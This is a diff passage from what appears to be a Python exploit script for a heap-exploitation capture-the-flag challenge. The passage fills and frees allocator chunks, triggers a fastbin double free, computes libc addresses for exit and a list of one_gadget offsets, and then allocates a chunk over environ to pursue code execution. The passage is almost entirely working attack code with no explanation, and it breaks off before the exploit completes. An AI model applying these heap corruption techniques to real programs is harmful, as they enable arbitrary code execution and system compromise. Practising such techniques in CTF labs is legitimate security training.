@@ -1,0 +1,26 @@
+add(2, 0x50, b"C"*8)
+add(3, 0x50, b"D"*8)
+add(4, 0x50, b"E"*8)
+add(5, 0x50, b"F"*8)
+add(6, 0x50, b"G"*8)
+add(7, 0x50, b"H"*8)
+add(8, 0x50, b"I"*8)
+add(9, 0x50, b"J"*8)
+add(10, 0x50, b"K"*8)
+for i in range(10, 1, -1):
+    delete(i)
+
+list_og = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
+delete(3) #double free fast bin
+delete(0)
+exit = libc + 0x455f0
+og = libc + list_og[5]
+info(f"exit: {hex(exit)}")
+info(f"og: {hex(og)}")
+add(0, 0x50, b"A")
+for i in range(5, 11):
+    add(i, 0x50, b"A")
+
+add(2, 0x50, p64(environ))
+add(3, 0x50, b"A")
+add(4, 0x50, b"A"*8)
